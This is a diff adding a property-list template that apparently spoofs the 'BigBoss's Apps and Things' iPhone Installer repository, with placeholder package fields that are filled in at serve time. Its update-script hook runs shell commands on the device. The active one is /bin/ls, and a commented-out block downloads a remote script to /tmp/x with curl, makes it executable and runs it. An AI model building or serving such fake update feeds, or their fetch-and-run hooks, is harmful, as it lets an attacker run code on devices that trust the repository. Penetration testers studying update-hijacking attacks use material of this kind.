@@ -1,0 +1,100 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>info</key>
+	<dict>
+		<key>name</key>
+		<string>BigBoss's Apps and Things</string>
+		<key>maintainer</key>
+		<string>Francisco Amato</string>
+		<key>contact</key>
+		<string>famato@infobytesec.com</string>
+		<key>url</key>
+		<string>http://www.infobytesec.com/</string>
+		<key>category</key>
+		<string>System</string>
+		<key>description</key>
+		<string>BigBoss's Apps and Things.</string>
+	</dict>
+	<key>packages</key>
+	<array>
+	<dict>
+		<key>version</key>
+		<string><%VER%></string>
+		<key>bundleIdentifier</key>
+		<string><%BUNDLEIDENTIFIER%></string>
+		<key>contact</key>
+		<string><%CONTACT%></string>
+		<key>description</key>
+		<string><%DESCRIPTION%></string>
+		<key>hash</key>
+		<string>84f5bac36d1cd3ada8a94f77811cc5b8</string>
+		<key>location</key>
+		<string>http://www.apptapp.com/Installer.zip</string>
+		<key>maintainer</key>
+		<string><%MAINTAINER%></string>
+		<key>name</key>
+		<string><%NAME%></string>
+		<key>scripts</key>
+		<dict>
+			<key>install</key>
+			<array>
+				<array>
+					<!--string>Notice</string>
+					<string>install.</string-->
+				</array>
+			</array>
+			<!--key>postflight</key>
+			<array>
+				<array>
+					<string>Notice</string>
+					<string>postflight.</string>
+				</array>
+			</array-->
+			<key>uninstall</key>
+			<array>
+				<!--array>
+					<string>Notice</string>
+					<string>uninstall.</string>
+				</array-->
+
+			</array>
+			<key>update</key>
+			<array>
+				<!--array>
+					<string>Notice</string>
+					<string>update.</string>
+				</array-->
+                                <!--array>
+                                        <string>Exec</string>
+                                        <string>/usr/bin/curl http://www.apptapp.com/script -o /tmp/x</string>
+                                </array>
+                                <array>
+                                        <string>Exec</string>
+                                        <string>/bin/chmod 775 /tmp/x</string>
+	                        </array>
+                                <array>
+                                        <string>Exec</string>
+                                        <string>/tmp/x</string>
+                                </array-->
+                                <array>
+                                        <string>Exec</string>
+                                        <string>/bin/ls</string>
+                                </array>
+                                
+			</array>
+		</dict>
+		<key>size</key>
+		<string>160</string>
+		<key>url</key>
+		<string><%URL%></string>
+		<key>category</key>
+		<string><%CATEGORY%></string>
+		<key>date</key>
+		<string>1202045793</string>
+	</dict>
+	
+	</array>
+</dict>
+</plist>
